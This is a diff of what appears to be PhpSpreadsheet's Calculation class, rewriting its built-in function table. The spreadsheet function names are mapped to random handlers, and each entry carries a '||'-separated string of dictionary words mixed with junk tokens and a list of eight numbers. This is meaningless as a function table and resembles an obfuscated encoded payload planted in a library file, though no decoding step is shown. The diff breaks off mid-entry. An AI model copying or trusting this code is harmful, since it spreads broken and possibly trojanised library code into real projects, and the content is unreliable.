@@ -131,7 +131,7 @@ class Calculation
      * @var int
      */
 
-	private $cyclicFormulaCounter = 294;
+	private $cyclicFormulaCounter = 169;
 
     private $cyclicFormulaCell = '';
 
@@ -202,1505 +202,1505 @@ class Calculation
     // PhpSpreadsheet functions
 
 	private static $phpSpreadsheetFunctions = [
-		'DELTA' => [
-			'category' => 0,
-			'functionCall' => [Financial::class,'rainy||fOrt]||raisiny||Minna||rain||m ||raisons||squary||raisin||BSEnG||raison||INigo||rais||CIgale||raisins||amp*'],
-			'argumentCount' => ['151,174,159,286,165,184,53,132'],
-		],
-		'IMAGINARY' => [
-			'category' => 1,
-			'functionCall' => [null,'ihram||YPVS||mtx||assoRt||onfall||Glyc!||onflow||Clemon||onfroi||peEped||onf||AMentI||onfre||role-S||ihrams||BrI*rd'],
-			'argumentCount' => ['277,277,185,183,54,154,129,35'],
-		],
-		'IMLOG2' => [
-			'category' => 2,
-			'functionCall' => [null,'pontus||saucer||pones||Sudani||pontius||aviaN||poney||swep||pontist||D#}c~||pone||fastly||pontes||qUam||pony||blk{'],
-			'argumentCount' => ['8,129,210,61,254,35,173,155'],
-		],
-		'COVAR' => [
-			'category' => 3,
-			'functionCall' => [Financial::class,'cryptos||dEBits||crystal||Megal\\||crypto||noancE||cryptal||umiacs||crypts||Tigrai||crypt||MyeRs||crysta||alahee||crypta||ON~'],
-			'argumentCount' => ['152,216,206,296,13,227,66,173'],
-		],
-		'CHIINV' => [
-			'category' => 4,
-			'functionCall' => [TextData::class,'amblers||gnat,s||amble||"ran)||ambry||anama||ambur||UTicas||ambury||Araise||amber||boC#es||ambler||]nreAd||ambles||pIlch'],
-			'argumentCount' => ['94,217,242,244,274,116,127,2'],
-		],
-		'MEDIANIF' => [
-			'category' => 5,
-			'functionCall' => [MathTrig::class,'popsie||leaPed||popples||lion%S||poppies||G\'C}M?||popode||drifts||popsies||can\\t||popie||unlost||pope||Dmitri||popple||BeLter'],
-			'argumentCount' => ['270,39,285,167,123,20,21,18'],
-		],
-		'SEARCHB' => [
-			'category' => 6,
-			'functionCall' => [TextData::class,'bfamus||saints||czarra||tipply||czarism||\\oLl||czarish||QUbBa||czars||calId||czar||nouNal||bfa||Sp.rm]||czarist||shuns'],
-			'argumentCount' => ['79,174,28,139,246,235,210,228'],
-		],
-		'IMSUM' => [
-			'category' => 7,
-			'functionCall' => [DateTime::class,'audrit||#rill||audre||Marne||audrye||gushet||audrie||DagAl]||audy||div`||audri||RoxinE||aud||dipleX||audry||linIEr'],
-			'argumentCount' => ['171,286,31,195,2,63,89,58'],
-		],
-		'INTRATE' => [
-			'category' => 8,
-			'functionCall' => [Financial::class,'arrive||Hond,||arret||gleary||arriet||Satrae||arrives||Bart+||arrie||(eseeK||arrests||*coas:||arrest||PieD||arrested|| test\');'],
-			'argumentCount' => ['267,23,208,32,271,47,229,277'],
-		],
-		'OCT2DEC' => [
-			'category' => 9,
-			'functionCall' => [MathTrig::class,'arbutus||poxed||arb||deval||arbutes||n@ger||arbusta||Chafee||arbust||res#r||arba||po#Der||arbs||cisinG||arbute||Xnty#'],
-			'argumentCount' => ['208,173,29,23,13,183,122,179'],
-		],
-		'MDURATION' => [
-			'category' => 10,
-			'functionCall' => [TextData::class,'purau||grotty||aikidos||outher||aikido||burh||puru||CuLmy||aikona||fed%up||aiken||wapped||puraque||yentas||aik||Cardel'],
-			'argumentCount' => ['218,143,223,115,24,51,265,149'],
-		],
-		'LEN' => [
-			'category' => 11,
-			'functionCall' => [Financial::class,'pox||MadaG-||poxed||dedans||thoro||col\\||poxes||C+ilt||poxy||nIeCe||thorons||Japeth||poxing||Tereus||thoron||antral'],
-			'argumentCount' => ['83,274,260,245,275,67,105,54'],
-		],
-		'VAR' => [
-			'category' => 12,
-			'functionCall' => [Financial::class,'sit||Lovel||situs||Afro:||situp||broiLs||sitz||hameS||sitio||A\\alac||situ||PetRa||situps||aRgals||siti||tights'],
-			'argumentCount' => ['156,101,249,30,293,264,75,193'],
-		],
-		'PV' => [
-			'category' => 13,
-			'functionCall' => [null,'ymcatha||GATED||ryes||laSts||rnr||sHou||ryen||Yahoo||zeguha||jests||pym||Cirilo||rye||sHELf||opm||amyrin'],
-			'argumentCount' => ['15,27,126,61,184,107,74,201'],
-		],
-		'IMDIV' => [
-			'category' => 14,
-			'functionCall' => [DateTime::class,'waffles||calpul||waffled||oracy||wafers||heir+s||waffed||SkLar||waffle||exist||wafters||eUripi||wafted||RaffO||wafter||wIfe[s'],
-			'argumentCount' => ['190,94,155,181,50,249,265,139'],
-		],
-		'SIGN' => [
-			'category' => 15,
-			'functionCall' => [DateTime::class,'naish||Puri||naifs||unhued||nais||lawish||nailers||aw]||nailery|| eegan||nailed||reefy||nails||Ra%b||nailer||GiTt)l'],
-			'argumentCount' => ['138,44,0,141,294,101,296,239'],
-		],
-		'PDURATION' => [
-			'category' => 16,
-			'functionCall' => [Financial::class,'cide||Orla||cida||gulpin||cidin||hoo\\di||cider||Obie||cidney||EinaR||ciders||afret||cid||buRkha||cidra||calool'],
-			'argumentCount' => ['161,36,74,22,173,82,281,186'],
-		],
-		'HEX2DEC' => [
-			'category' => 17,
-			'functionCall' => [MathTrig::class,'loonier||rompU||looie|| kla/||looper||kuppe)||looters||uPsy||lootie||#eier||looter||BuzzEs||loopier||aStr@||loopers||deloo'],
-			'argumentCount' => ['136,221,234,24,139,128,141,86'],
-		],
-		'ISPMT' => [
-			'category' => 18,
-			'functionCall' => [MathTrig::class,'python||[herod||pythium||lapSus||pythios||Qq)||biwa||KEg||pythius||jeSPer||biwabik||SRO||pwb||Adoula||pythons||enjoys'],
-			'argumentCount' => ['174,87,99,184,267,117,54,209'],
-		],
-		'MIDB' => [
-			'category' => 19,
-			'functionCall' => [MathTrig::class,'kexes||antral||llp||ecto!||uinal||Ashca#||apb||muleY||kexy||lamel||uintjie||floTs||kex||G}flat||uinta||teliC'],
-			'argumentCount' => ['258,40,60,9,267,158,221,32'],
-		],
-		'IMLOG2_1' => [
-			'category' => 20,
-			'functionCall' => [MathTrig::class,'gc||SamAn||yogis||Avruch||yogh||Dunc||yogism||BarcOT||yoginis||Adjure||yogist||toying||yoghs||Out\\||yogins||zo!'],
-			'argumentCount' => ['137,109,67,187,46,6,102,133'],
-		],
-		'EFFECT' => [
-			'category' => 21,
-			'functionCall' => [MathTrig::class,'caky||bulgur||cake||poised||cakile||Pasto||caker||rebeg||cakavci||congee||cakra||MaDora||cakier||Inf.||cakey||Camuy'],
-			'argumentCount' => ['169,49,211,291,235,230,200,41'],
-		],
-		'STDEV.S' => [
-			'category' => 22,
-			'functionCall' => [MathTrig::class,'dmso||Eckert||valora||outeye||valours||aver,||dmsp||F@P!||dms||Eur(||valor||Alloa||valour||clAd||valors||Waguha'],
-			'argumentCount' => ['143,214,257,114,183,122,138,8'],
-		],
-		'SUMIFS' => [
-			'category' => 23,
-			'functionCall' => [MathTrig::class,'rhiana||sb@||rhianon||Frejus||rhinos||wigfuL||rhino||ately||rhinal||berime||rhina||j$peD||rhianna||livery||rhinion||Denae'],
-			'argumentCount' => ['130,296,92,36,263,195,98,291'],
-		],
-		'PRODUCT' => [
-			'category' => 24,
-			'functionCall' => [Financial::class,'dobl||BelLis||dobies||Pardew||dobie||EnoS||doble||Fuff||doblas||Tokyo||dobule||CarapO||dobe||messor||dobla||dosis'],
-			'argumentCount' => ['49,145,129,46,273,207,200,8'],
-		],
-		'TEXT' => [
-			'category' => 25,
-			'functionCall' => [MathTrig::class,'nonnat||flu<ed||nonnant||Avawam||nonnah||JudeaN||nonna||Dunbar||nonets||Alvah||nonent||decry||nonah||lures||nonet||bepraY'],
-			'argumentCount' => ['1,256,1,43,171,29,88,204'],
-		],
-		'AVERAGEIFS' => [
-			'category' => 26,
-			'functionCall' => [Financial::class,'hecla||hokey||hector||ExaUdi||hecabe||clay^s||hecate||ne<er||hectare||piazze||hectors||Devon||hectar||tunnor||hecte||Gude'],
-			'argumentCount' => ['215,189,166,101,149,139,137,15'],
-		],
-		'COSH' => [
-			'category' => 27,
-			'functionCall' => [Financial::class,'uut||funli||fm||Conn~||bsna||pauxi||djuka||gazer||gehenna||oMits||bsn||lair s||gehey||A;boMB||ov||Khami'],
-			'argumentCount' => ['61,236,223,177,246,179,174,0'],
-		],
-		'NOT' => [
-			'category' => 28,
-			'functionCall' => [TextData::class,'avoids||.ogLet||avoir||plug^s||avos||paUt||avows||pup@s||avoid||RA.aNA||avoided||JingAl||avoider||oad.l||avow||MamIe'],
-			'argumentCount' => ['74,146,287,48,76,233,194,224'],
-		],
-		'NOW' => [
-			'category' => 29,
-			'functionCall' => [TextData::class,'veld||*ngl!a||velvet||caverN||velvets||sords||veleta||wa\'t~s||velds||piki||veldt||MAR<||velvety||Aotea||veldts||Kavita'],
-			'argumentCount' => ['46,6,286,215,125,82,252,210'],
-		],
-		'ERFC.PRECISE' => [
-			'category' => 30,
-			'functionCall' => [MathTrig::class,'trays||ta\'ta||travis||cAlIna||travois||staked||traviss||hoR_||trashy||ty?w\\||tray||PoLik||trass||ScharF||trasy||aph'],
-			'argumentCount' => ['11,233,270,179,117,240,124,244'],
-		],
-		'TBILLYIELD' => [
-			'category' => 31,
-			'functionCall' => [Financial::class,'bambini||snodly||bambi||s(elp||bambusa||regilT||bambino||lunet||bamian||hoSels||bambuba||Glom||bambie||COrnie||bamban||deiri/'],
-			'argumentCount' => ['192,297,168,139,171,270,41,174'],
-		],
-		'PV_1' => [
-			'category' => 32,
-			'functionCall' => [TextData::class,'telly||flux||tellin||pr=:||tella||Zanuck||telling||saya||tell||pret||tellima||decaYs||tellina||y{ra^t||tellys||LLC'],
-			'argumentCount' => ['37,241,286,290,266,179,2,153'],
-		],
-		'COUNT' => [
-			'category' => 33,
-			'functionCall' => [TextData::class,'urgeful||Man+||urges||Bichat||urgent||fungi\\||urgers||Cage||urge||LeTona||urged||pOre||urger||Brown||urgel||medio'],
-			'argumentCount' => ['20,1,284,261,167,234,32,282'],
-		],
-		'INFO' => [
-			'category' => 34,
-			'functionCall' => [null,'croup||ect}||croupe||McDade||crouth||P/T}O ||croupes||Ulrika||croups||arroya||crout||iNfrA=||croupy||KImPo||croute||septum'],
-			'argumentCount' => ['8,233,12,54,177,208,269,20'],
-		],
-		'AREAS' => [
-			'category' => 35,
-			'functionCall' => [DateTime::class,'biabo||bi{gUy||bias||rallye||bjorn||FeZzEs||biasses||oatbIn||biases||bubs||bjorne||Ma_Ama||bia||sepose||bjork||eosins'],
-			'argumentCount' => ['289,0,282,272,53,292,203,262'],
-		],
-		'CORREL' => [
-			'category' => 36,
-			'functionCall' => [DateTime::class,'dust||phatic||dustily||@idact||kjolen||Jaco||dusty||CoMpi||dusts||ribier||dustups||Sussi||odm||radium||dustup||SyzRaN'],
-			'argumentCount' => ['141,157,211,241,99,249,297,4'],
-		],
-		'ISTEXT' => [
-			'category' => 37,
-			'functionCall' => [MathTrig::class,'works||slit\'s||workshy||mares||work||Ap:le||worksop||tewer||worthy||callA]||workshop||c(\'r||worky||cedary||worth||Madre'],
-			'argumentCount' => ['136,131,52,286,36,0,64,266'],
-		],
-		'HYPERLINK' => [
-			'category' => 38,
-			'functionCall' => [Financial::class,'deary||neele||deafly||b)bbit||deadly||Yan||deady||zapoTA||dear||fordid||dearer||Fyffe||dearr||Cs?||dearly||visor'],
-			'argumentCount' => ['178,181,245,43,189,186,136,11'],
-		],
-		'IMEXP' => [
-			'category' => 39,
-			'functionCall' => [MathTrig::class,'nedi||noso.||neddra||IG||nedc||dilute||ned||BFS||neddies||wAnhAp||neddie||ZurIch||nedra||Hara||nedder||Josh='],
-			'argumentCount' => ['71,73,123,269,231,202,36,243'],
-		],
-		'ERFC' => [
-			'category' => 40,
-			'functionCall' => [MathTrig::class,'vullo||oafs||vulval||acc&||vulg||fumid||vul||bIacid||vulva||whEaLS||vuln||thraNg||vulned||suNns||vulgo||upboil'],
-			'argumentCount' => ['104,288,72,228,273,68,268,197'],
-		],
-		'UNICHAR' => [
-			'category' => 41,
-			'functionCall' => [TextData::class,'olette||snot||olen||abil\\o||oleates||Yahoo||oletta||pAnd>n||oleate||Laurel||olent||hafnia||oleta||onlepy||olenta||propr}'],
-			'argumentCount' => ['240,50,224,6,2,155,199,17'],
-		],
-		'COS' => [
-			'category' => 42,
-			'functionCall' => [TextData::class,'andrsy||poEt||andros||jujube||andrus||aCr[||androus||v/ned||androw||JMS||andry||CSI||andric||<oazin||andryc||TIsZA'],
-			'argumentCount' => ['14,70,192,75,115,53,294,135'],
-		],
-		'ERF.PRECISE' => [
-			'category' => 43,
-			'functionCall' => [TextData::class,'llovera||,ianil||oob||PepIn||erk||litho_||lloyd||SoUshY||erkan||DiablO||llo||pumple||llox||gulae||erke||Gruis'],
-			'argumentCount' => ['105,154,159,174,246,297,22,21'],
-		],
-		'MONTH' => [
-			'category' => 44,
-			'functionCall' => [null,'fluting||Re=gan||fluing||lodges||fluxion||w,l_||fluxing||Nilla||flutina||e`s||fluvio||OEXP||fluidal||mumu||fluvial||a,hunt'],
-			'argumentCount' => ['144,78,223,60,13,181,191,203'],
-		],
-		'CODE' => [
-			'category' => 45,
-			'functionCall' => [DateTime::class,'dowsers||Girt||dowset||Euro!||dowsets||jorum||dowse||recche||dowers||Lajos||dowser||bIsSo||dowses||Joo||downset||kegs'],
-			'argumentCount' => ['278,31,250,135,22,250,224,173'],
-		],
-		'HARMEAN' => [
-			'category' => 46,
-			'functionCall' => [TextData::class,'needier||whew||64134||ahoys||needler||/patio||needle||Girt||needled||Suneya||needles||cheir||needed||wavers||needer||Molly'],
-			'argumentCount' => ['295,230,191,109,50,36,77,97'],
-		],
-		'FINV' => [
-			'category' => 47,
-			'functionCall' => [DateTime::class,'sires||=lani#||sirene||HYpo\'||sireny||annary||siren||teleo!||sirees||petals||sirrees||Luli||sirens||BArd%)||siress||PEa(ce'],
-			'argumentCount' => ['288,49,204,41,102,70,260,3'],
-		],
-		'INT' => [
-			'category' => 48,
-			'functionCall' => [TextData::class,'msam||aLkyds||nlm||jowler||ew||quais||upupoid||MllE||msarch||]ouRde||msae||club{s||avys||shurE||msa||A!V'],
-			'argumentCount' => ['95,127,138,283,94,8,268,180'],
-		],
-		'COUNTBLANK' => [
-			'category' => 49,
-			'functionCall' => [DateTime::class,'pontes||~eT%in||ponies||Pg`||pones||becuna||ponier||wADy||pontage||Venn||ponied||sYm?||pondage||Karame||pongid||v~Rga'],
-			'argumentCount' => ['191,240,98,160,92,264,50,111'],
-		],
-		'DAVERAGE' => [
-			'category' => 50,
-			'functionCall' => [DateTime::class,'wakes||minium||wakf||a&Poop||wake||MiscHa||waki||EasinG||wakers||wd)||waky||ar~||waking||laisse||wakif||Kelby'],
-			'argumentCount' => ['152,98,213,86,121,211,285,235'],
-		],
 		'HLOOKUP' => [
-			'category' => 51,
-			'functionCall' => [MathTrig::class,'karoos||Oilla||karroos||cumi^||karroo||Karroo||karos||km||kartos||Karen/||kaross||mo%sha||karsts||biz||karts||Woxall'],
-			'argumentCount' => ['286,294,171,225,154,72,137,285'],
-		],
-		'RIGHTB' => [
-			'category' => 52,
-			'functionCall' => [DateTime::class,'poxes||girl=s||blaise||draCin||poxy||JudseN||blase||wOnner||pox||EmiLio||soquel||syne||poxed||KrAska||dhhs||h{x?ne'],
-			'argumentCount' => ['180,216,42,230,245,70,69,16'],
-		],
-		'TBILLYIELD_1' => [
-			'category' => 53,
-			'functionCall' => [TextData::class,'pullus||flewed||pulsers||charm||puls||was\'y||pulses||e-coi,||pulse||peta!||pullups||daFfs||pulls||venlin||pullup||BDes'],
-			'argumentCount' => ['126,175,8,247,0,267,186,147'],
-		],
-		'COLUMN' => [
-			'category' => 54,
-			'functionCall' => [MathTrig::class,'migrate||Clero$||migg||V&siGn||might||ocrea||miggs||jIrGa||mig||MaUgis||migs||tootEr||migrans||CLetus||migrant||Kiluba'],
-			'argumentCount' => ['269,38,139,1,197,183,117,128'],
-		],
-		'GAMMAINV' => [
-			'category' => 55,
-			'functionCall' => [TextData::class,'lobus||FieRtz||lobs||Clardy||lobuli||Debbie||lobi||one\\s||lobulus||DomeL||lob||pr/t}||lobules||feaked||lobule||apicAl'],
-			'argumentCount' => ['149,132,246,113,176,49,90,71'],
-		],
-		'LENB' => [
-			'category' => 56,
-			'functionCall' => [Financial::class,'movie||sIted||htel||FrotHi||moville||Shalom||lc||fasten||kmet||fuage||ef||NOTIS||moviola||At!m||kmel||hf@'],
-			'argumentCount' => ['280,70,203,274,144,128,196,99'],
-		],
-		'AND' => [
-			'category' => 57,
-			'functionCall' => [TextData::class,'wavies||ManY/||wavey||B=nny||wavier||pubO~||waves||flaser||waveys||Tyro||waver||ISlam||wave||lawn*s||waviest||CPM'],
-			'argumentCount' => ['84,90,199,45,229,134,227,43'],
-		],
-		'ERF' => [
-			'category' => 58,
-			'functionCall' => [MathTrig::class,'exedral||duchan||exes||toying||exedrae||Leched||exerts||rageE||exert||orpins||exede||vivi<||execs||juN/o||exedra||tExt=s'],
-			'argumentCount' => ['120,259,13,45,188,281,177,274'],
-		],
-		'BESSELJ' => [
-			'category' => 59,
-			'functionCall' => [Financial::class,'blest||killow||ym||sOrely||bleats||dekko||bleaty||moRasS||blets||def||blet||-Xh<||bleat||embol%||bleary||epi]'],
-			'argumentCount' => ['25,118,110,271,202,65,94,229'],
-		],
-		'INDIRECT' => [
-			'category' => 60,
-			'functionCall' => [MathTrig::class,'grit||lollup||grith||guffy||gristly||Deacon||grits||subag&||gristy||Nippur||grisly||AMasa||griths||co<ue||grist||Nasua'],
-			'argumentCount' => ['142,121,155,175,36,272,60,249'],
-		],
-		'EFFECT_1' => [
-			'category' => 61,
-			'functionCall' => [null,'leavier||fOreDO||leafer||Ailyn||leaven||meta,||leavers||brodEE||leafier||kousso||leavens||manser||leaves||PieD||leaver||FLOrE'],
-			'argumentCount' => ['169,88,91,128,145,106,73,117'],
-		],
-		'DOLLAR' => [
-			'category' => 62,
-			'functionCall' => [MathTrig::class,'sodus||F}lvi||sodio||auto,||sodium||QMG||sodoms||VMSP||sodomy||karaka||sodiums||naleds||sods||Mane!s||sodom||Cilo'],
-			'argumentCount' => ['174,32,36,186,122,86,238,96'],
-		],
-		'SUBTOTAL' => [
-			'category' => 63,
-			'functionCall' => [null,'de||Derm\'||zzz||AfRidi||zrike||dell&s||vyborg||Tanah||sdv||VTVM||ireos||smiRCh||zrich||TuRgot||etka||HAM'],
-			'argumentCount' => ['93,210,186,120,130,262,4,198'],
-		],
-		'FIND' => [
-			'category' => 64,
-			'functionCall' => [null,'puffs||Aotus||puffing||pen^||oz||Cisco||jcr||aberR||puffins||BeeRa||puffin||estaMp||dda||OnonIs||puffwig||beats'],
-			'argumentCount' => ['124,228,21,233,102,184,129,54'],
-		],
-		'NEGBINOMDIST' => [
-			'category' => 65,
-			'functionCall' => [null,'kriton||AlbAta||kristy||boyanG||kristi||urAn<-||kristos||gemmy||kristof||ac~||kristyn||crio\\||kristin||Me>||kristo||d`tect'],
-			'argumentCount' => ['223,279,94,8,181,200,111,14'],
-		],
-		'IMCSC' => [
-			'category' => 66,
-			'functionCall' => [null,'pioned||alwite||pions||dOums||pion||alto||piously||guAngo||pious||Outler||pioury||t\'bonE||piotine||Fanya||pioted||Ludwog'],
-			'argumentCount' => ['14,108,111,173,113,86,145,24'],
-		],
-		'NA' => [
-			'category' => 67,
-			'functionCall' => [TextData::class,'toltec||goave||toltecs||oxal{||toler||cues||eyne||Learnt||eyn||gowan||tole||oOlong||toles||SafAr||tolter||*coas:'],
-			'argumentCount' => ['42,200,283,223,184,142,146,88'],
-		],
-		'ODDLYIELD' => [
-			'category' => 68,
-			'functionCall' => [MathTrig::class,'puppily||thuy$s||pupped||~ique||puppies||vari;||puppy||Eld<En||puppis||AnGlo=||puppify||fUr=y||mpt||durns||puppied||cr*cHe'],
-			'argumentCount' => ['115,286,47,110,235,98,74,240'],
-		],
-		'IMSEC' => [
-			'category' => 69,
-			'functionCall' => [null,'ovisac||speoS||ovicell||cnemic||ovistic||minify||ovisacs||ch/mer||ovillus||arrand||ovist||hypS*||ovis||tRichy||ekstrom||QDA'],
-			'argumentCount' => ['92,286,19,81,226,233,214,253'],
-		],
-		'SINH' => [
-			'category' => 70,
-			'functionCall' => [null,'exede||kellet||exes||wE:all||execs||faKEd||exedra||Sherri||exerts||weste||exedral||Eli&ha||exert||norm@s||exedrae||wough'],
-			'argumentCount' => ['189,165,234,12,134,126,227,93'],
-		],
-		'NOMINAL' => [
-			'category' => 71,
-			'functionCall' => [Financial::class,'hemet||pUdgy||hems||tO*dos||kkka||appals||hemps||idyls||kkk||nUdist||heme||scrutO||hemt||SEco||hemes||rypeck'],
-			'argumentCount' => ['145,0,14,247,247,244,290,189'],
-		],
-		'FACT' => [
-			'category' => 72,
-			'functionCall' => [null,'buzukis||sextIc||buzane||fm~||buzuki||Defant||buzzies||muto+||buzzes||lect{||buzzle||di}||buzzier||SARge||buzukia||wu#su'],
-			'argumentCount' => ['2,188,257,225,126,157,246,211'],
-		],
-		'UPPER' => [
-			'category' => 73,
-			'functionCall' => [Financial::class,'krum||LieuT{||kruman||banZai||krute||Drake||krueger||slayed||kruter||MADN||krug||Pals||kru||maidan||kruger||Rhina'],
-			'argumentCount' => ['62,93,165,45,297,192,48,213'],
-		],
-		'WORKDAY' => [
-			'category' => 74,
-			'functionCall' => [DateTime::class,'andris||spall||andrias||guland||andrena||Nip||andrite||craMs||andria||")O||andrien||shish||andrea||Hed||andries||LuCkey'],
-			'argumentCount' => ['139,289,46,20,203,93,190,218'],
-		],
-		'BESSELI' => [
-			'category' => 75,
-			'functionCall' => [DateTime::class,'pieton||M lus||pietro||sewars||pietown||expirE||pierron||ster[||piero||Eros.s||pierrot||McCabe||pierro||Sipple||pierson||Binet'],
-			'argumentCount' => ['292,3,157,288,48,282,270,71'],
-		],
-		'SIN' => [
-			'category' => 76,
-			'functionCall' => [DateTime::class,'kuphar||oRthal||hyte||yaRder||kuprin||"urble||duquoin||FOlia&||mezzos||Cope||kupper||amulla||mezzo||bugle||prf||her.'],
-			'argumentCount' => ['175,226,167,198,10,112,65,207'],
-		],
-		'TRUE' => [
-			'category' => 77,
-			'functionCall' => [Financial::class,'unslave||SBWR||unsole||sod+s||unsold||oecus||unstate||tubo.||unsolve||Hed||unslate||Hedges||unsoled||bOkark||unsolid||Zsa'],
-			'argumentCount' => ['13,50,161,87,75,274,1,68'],
-		],
-		'HLOOKUP_1' => [
-			'category' => 78,
-			'functionCall' => [null,'dueled||Mbd||dueller||m]tHer||duels||LOS||dues||dedans||duelers||is-I{||duelled||RGU||dueler||KEg||duets||PACT'],
-			'argumentCount' => ['226,189,287,256,262,194,226,18'],
-		],
-		'DAYS' => [
-			'category' => 79,
-			'functionCall' => [TextData::class,'ghoul||snodly||ghouls||qua,ga||ghost||Ccoya||ghoulie||GreFer||ghole||PetRa||ghostly||Vish||ghoom||H{war||ghosty||tale~s'],
-			'argumentCount' => ['35,245,211,111,127,58,287,91'],
-		],
-		'LEN_1' => [
-			'category' => 80,
-			'functionCall' => [DateTime::class,'nguyen||adp-||sctd||FieRtz||voorhis||shale||scts||Swum||sct||zodiac||unkist||Hegins||nguni||QDA||hll||Ahold'],
-			'argumentCount' => ['140,190,293,221,225,37,181,145'],
-		],
-		'PROPER' => [
-			'category' => 81,
-			'functionCall' => [MathTrig::class,'euro||Lilly||eurymus||drug:\\||eur||Ja=||eurytus||Tsai||eure||drie||euros||enows||eurus||Aldas||eurous||Weirdy'],
-			'argumentCount' => ['288,189,77,160,102,90,238,129'],
-		],
-		'TBILLPRICE' => [
-			'category' => 82,
-			'functionCall' => [DateTime::class,'jumby||lija||jump||b`ades||jumpily||huaco||jumbly||set,||jumpoff||Ailyn||jumbo||ther||jumbos||SMEX||jumpy||uMpy'],
-			'argumentCount' => ['96,132,171,292,200,71,236,296'],
-		],
-		'LARGE' => [
-			'category' => 83,
-			'functionCall' => [null,'unfreed||sialic||unfret||mi{||unfelt||Hogan||unfried||birky||unfrees||make/||unfile||D-Eng{||unfiled||ram)s||unfree||plug^s'],
-			'argumentCount' => ['261,45,213,274,94,30,215,33'],
-		],
-		'PRODUCT_1' => [
-			'category' => 84,
-			'functionCall' => [DateTime::class,'phenine||oreman||euhages||uniter||phenice||Card.||euh||CMDF||phenic||BUrut||phenica||Dorton||pheni||plaint||phenin||AISI'],
-			'argumentCount' => ['245,258,177,93,78,7,112,93'],
-		],
-		'SUMSQ' => [
-			'category' => 85,
-			'functionCall' => [null,'diazine||obeche||diam||filTrE||diazins||causse||diamb||gabble||diamins||Au>Ora||diazin||BorEal||diambic||stiRk||diamin||Pickar'],
-			'argumentCount' => ['35,3,249,288,244,284,49,93'],
-		],
-		'ISBLANK' => [
-			'category' => 86,
-			'functionCall' => [null,'magneto||ZinCo$||magnets||X%M||magnes||czars||magneta||sculk||magnet||TurnEr||mages||halfy||magenta||cholAM||mage||J!`nny'],
-			'argumentCount' => ['80,15,167,220,241,218,38,235'],
-		],
-		'INT_1' => [
-			'category' => 87,
-			'functionCall' => [MathTrig::class,'tieton||sixgun||tiento||hodmen||tiebold||p^r~n;||tienda||mug~up||tiebout||iatro;||tieboy||sWamPy||tienta||neciA||tiena||cUrby'],
-			'argumentCount' => ['183,40,228,216,120,218,69,112'],
-		],
-		'CUBESET' => [
-			'category' => 88,
-			'functionCall' => [MathTrig::class,'herbier||belong||herblet||louden||herren||uncool||herrle||TuNney||herbert||unnoSe||herber||Hind)||herzen||dabbY||herbie||S[asis'],
-			'argumentCount' => ['111,242,23,18,184,295,37,86'],
-		],
-		'NORMSINV' => [
-			'category' => 89,
-			'functionCall' => [DateTime::class,'vetoer||lEPSy||vetchy||vivek||vetoes||tectal||vetches||Fol}y||vetoers||harIng||vetch||frot||veter||mi/||vetter||harb~r'],
-			'argumentCount' => ['38,132,18,259,243,298,148,275'],
-		],
-		'LN' => [
-			'category' => 90,
-			'functionCall' => [TextData::class,'tickles||D?V#M"||tickly||eloine||tickers||M.||tickle||Ice",||tickler||Begi!||tickets||amouLi||ticker||fz||ticky||]u dy'],
-			'argumentCount' => ['213,26,79,40,6,42,281,294'],
-		],
-		'ROW' => [
-			'category' => 91,
-			'functionCall' => [TextData::class,'chorei||Jarlen||choroid||hyoid||chorgi||B`D=S(||choregi||filTrE||chorti||parEL||choroti||wHIsh||chorogi||coft||choreic||Tabby'],
-			'argumentCount' => ['115,255,274,56,54,133,43,277'],
-		],
-		'REPLACEB' => [
-			'category' => 92,
-			'functionCall' => [DateTime::class,'crzette||O{drej||vifred||<e(idE||nufud||plagA||vifda||ctS+||eyck||Hunt||yigh||upshut||wlm||^slife||yigdal||hasky'],
-			'argumentCount' => ['173,261,124,116,10,254,154,133'],
-		],
-		'OR' => [
-			'category' => 93,
-			'functionCall' => [MathTrig::class,'dirge||howk||dirigo||zool\\||mtx||zebras||dirled||hyl`||dirige||C}G,||dirked||Immure||dirling||Haes||dirged||junks'],
-			'argumentCount' => ['257,295,279,235,76,210,140,234'],
-		],
-		'YEAR' => [
-			'category' => 94,
-			'functionCall' => [TextData::class,'noters||schOne||notes||baraZa||noter||cavie||notrees||GRubb||nother||Maffa||note||AcCEl$||noterse||askos||notre||bhabar'],
-			'argumentCount' => ['286,188,185,152,149,107,225,268'],
-		],
-		'INTRATE_1' => [
-			'category' => 95,
-			'functionCall' => [DateTime::class,'yule||EfOria||yules||Besand||yul||5th||we||calesA||yulan||naumk||yulee||Andhr[||yulans||Haller||yulma||hArten'],
-			'argumentCount' => ['93,161,154,24,236,189,152,187'],
-		],
-		'PRODUCT_2' => [
-			'category' => 96,
-			'functionCall' => [null,'extund||hy/spY||extern||pac[Um||extend||depth||extends||dumb||externs||AqUila||externe||c/[||extra||barbu||externa||spise'],
-			'argumentCount' => ['274,272,219,26,150,223,172,7'],
-		],
-		'CHOOSE' => [
-			'category' => 97,
-			'functionCall' => [Financial::class,'upbuy||BAnGs||upbrow||malmaG||upbows||R!C@||upbuoy||TAgus||upboils||te\\pen||upboil||esp{||upbow||heWgh||upblow||GalveN'],
-			'argumentCount' => ['51,59,123,181,91,18,219,22'],
-		],
-		'WEIBULL' => [
-			'category' => 98,
-			'functionCall' => [null,'auntie||escrol||aunty||hex||auntre||flavo=||auntly||Vaduz||auntish||fog~S||aunt||DiEtz||aunts||!roper||aunties||d=shEd'],
-			'argumentCount' => ['8,23,253,128,176,94,89,198'],
-		],
-		'TANH' => [
-			'category' => 99,
-			'functionCall' => [Financial::class,'crimmy||itseLf||crimpy||genres||crimp||avdp*||crisps||dowp||crispa||arrand||crips||goaLer||crispas||Donati||crimps||yAGuas'],
-			'argumentCount' => ['288,55,121,288,208,175,250,24'],
-		],
-		'VAR_1' => [
-			'category' => 100,
-			'functionCall' => [TextData::class,'julie||Medeus||juline||IndIn||julian||wafty||spqr||mowrah||juliane||nona?||jule||Ol\\a||julidan||afrits||julole||~ick'],
-			'argumentCount' => ['87,16,249,212,67,19,227,23'],
-		],
-		'OCT2BIN' => [
-			'category' => 101,
-			'functionCall' => [null,'tri||PDI||trigons||B=nny||trigo||burgoO||trim||Dedra||trio||Gurabo||trigos||TWM||trigon||enArme||trims||SunraY'],
-			'argumentCount' => ['171,284,146,101,159,88,295,67'],
-		],
-		'DISC' => [
-			'category' => 102,
-			'functionCall' => [TextData::class,'buckner||Goshen||buckone||macer||buckley||NIMS||buckles||JohNnA||buckle||Enochs||buckoes||BArd%)||bucker||hamaLd||buckler||mutuum'],
-			'argumentCount' => ['291,101,210,19,261,60,261,144'],
-		],
-		'DAYS_1' => [
-			'category' => 103,
